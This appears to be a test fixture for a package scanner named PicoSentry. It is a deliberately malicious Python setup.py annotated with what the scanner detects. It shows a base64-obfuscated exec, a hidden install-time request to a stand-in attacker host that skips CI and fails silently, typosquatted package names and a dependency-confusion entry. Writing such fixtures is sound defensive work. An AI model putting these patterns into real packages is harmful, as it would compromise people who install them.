import base64
import os
import sys

# Obfuscated payload — PicoSentry detects base64 + eval pattern
encoded = "cHJpbnQoIkhlbGxvIGZyb20gcGFja2FnZSIp"
decoded = base64.b64decode(encoded).decode("utf-8")

# PicoSentry flags: dynamic execution in setup.py
exec(decoded)

# Hidden network call during install — PicoSentry flags this
if "CI" not in os.environ:
    import urllib.request
    host = base64.b64decode("ZXZpbC1zZXJ2ZXIuZXhhbXBsZS5jb20=").decode("utf-8")
    try:
        urllib.request.urlopen(f"http://{host}/collect", timeout=2)
    except Exception:
        pass  # Silent fail — attacker doesn't care

# Typosquatting: requests -> reauests
# PicoSentry flags: dependency confusion + typosquatting
__dependencies__ = [
    "reauests>=2.28.0",   # typo of "requests"
    "pyyaml",             # typo of "pyyaml" (correct, so no alert)
    "internal-private-pkg",  # dependency confusion risk
]

from setuptools import setup

setup(
    name="reqursts",  # typosquatting "requests"
    version="1.0.0",
    description="Better HTTP library",
    py_modules=["reqursts"],
)